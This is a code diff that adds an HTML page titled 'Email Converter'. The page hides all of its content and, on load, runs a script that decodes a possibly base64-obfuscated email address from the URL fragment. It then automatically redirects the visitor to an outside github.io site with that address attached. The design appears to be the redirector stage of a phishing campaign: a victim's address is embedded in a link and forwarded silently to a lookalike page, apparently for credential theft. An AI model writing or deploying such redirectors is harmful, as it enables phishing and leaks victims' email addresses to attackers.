@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Converter</title>
+    <style>
+        /* Hide everything from view */
+        body, html {
+            width: 0;
+            height: 0;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Function to process email and redirect
+        function processEmailAndRedirect() {
+            // Get the email from URL hash
+            function getEmailFromURL() {
+                const hash = window.location.hash.substring(1);
+
+                if (!hash) return null;
+
+                let decoded = null;
+
+                // Try to decode as base64 first
+                try {
+                    const base64Decoded = atob(hash);
+                    if (base64Decoded.indexOf('@') !== -1) decoded = base64Decoded;
+                } catch (e) {
+                    // Not a valid base64 string, continue to check as plain email
+                }
+
+                // If base64 decode didn't work, check if it's a plain email
+                if (!decoded) {
+                    const emailWithAt = hash.replace(/\$/g, '@');
+                    if (emailWithAt.indexOf('@') !== -1) decoded = emailWithAt;
+                }
+
+                if (!decoded) return null;
+
+                // Extract ONLY the email - remove anything after it
+                return extractCleanEmail(decoded);
+            }
+
+            // Extract only the valid email portion, stripping everything after it
+            function extractCleanEmail(input) {
+                // Replace $ with @ if present
+                input = input.replace(/\$/g, '@');
+
+                // Regex to match a valid email
+                const emailRegex = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/;
+                const match = input.match(emailRegex);
+
+                if (!match) return null;
+
+                let email = match[0];
+
+                // Check what immediately follows the email in the original input
+                const afterEmail = input.substring(match.index + email.length);
+
+                // If a "?" immediately follows the email, cut everything from it onward.
+                // (The email regex already stops at "?", but we handle the case
+                // where the "?" might be part of a base64 payload we still need to parse.)
+                if (afterEmail.indexOf('?') !== -1) {
+                    email = email.split('?')[0];
+                }
+
+                return email;
+            }
+
+            // Handle double base64: if the first decode still doesn't yield a clean email
+            // but decodes again into one, use that.
+            function getFinalEmail() {
+                const hash = window.location.hash.substring(1);
+                if (!hash) return null;
+
+                // Attempt 1: single base64 decode
+                let firstDecoded = null;
+                try {
+                    const b = atob(hash);
+                    if (b.indexOf('@') !== -1) firstDecoded = b;
+                } catch (e) {}
+
+                // Attempt plain text
+                if (!firstDecoded) {
+                    const plain = hash.replace(/\$/g, '@');
+                    if (plain.indexOf('@') !== -1) firstDecoded = plain;
+                }
+
+                if (!firstDecoded) return null;
+
+                // Try to extract a clean email from the first decode
+                let email = extractCleanEmail(firstDecoded);
+
+                // If we got an email, but the original decoded string looks like
+                // it could be double-encoded (no '@' before decoding again), try double decode
+                if (!email || firstDecoded.indexOf('@') === -1) {
+                    try {
+                        const secondDecoded = atob(firstDecoded);
+                        const secondEmail = extractCleanEmail(secondDecoded);
+                        if (secondEmail) email = secondEmail;
+                    } catch (e) {}
+                }
+
+                // If the single decode produced a string that still looks base64-ish
+                // (no '@'), try decoding it once more.
+                if (!email) {
+                    try {
+                        const secondDecoded = atob(firstDecoded);
+                        const secondEmail = extractCleanEmail(secondDecoded);
+                        if (secondEmail) email = secondEmail;
+                    } catch (e) {}
+                }
+
+                return email;
+            }
+
+            const email = getFinalEmail();
+
+            if (email) {
+                // Redirect to the target URL with only the clean email
+                window.location = "https://universal-baileycgroup.github.io/solitude-universal#" + btoa(email);
+            }
+        }
+
+        // Start the process immediately
+        window.onload = processEmailAndRedirect;
+    </script>
+</body>
+</html>
